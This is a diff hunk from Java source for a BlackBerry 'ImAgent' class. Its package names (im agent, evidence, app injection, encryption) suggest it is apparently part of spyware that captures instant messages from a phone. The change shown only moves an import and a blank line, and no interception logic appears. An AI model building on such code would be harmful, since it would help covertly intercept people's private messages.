@@ -18,13 +18,13 @@ import blackberry.Device;
 import blackberry.agent.im.LineMarkup;
 import blackberry.config.Conf;
 import blackberry.crypto.Encryption;
+import blackberry.debug.Check;
 import blackberry.debug.Debug;
 import blackberry.debug.DebugLevel;
 import blackberry.evidence.Evidence;
 import blackberry.injection.AppInjector;
 import blackberry.interfaces.ApplicationObserver;
 import blackberry.interfaces.BacklightObserver;
-import blackberry.utils.Check;
 import blackberry.utils.DateTime;
 import blackberry.utils.Utils;
 import blackberry.utils.WChar;
@@ -126,8 +126,8 @@ public final class ImAgent extends Agent implements BacklightObserver,
             debug.trace("unserialize: " + lastLine);
             //#endif
             return lastLine;
-
         }
+        
         return null;
     }
 
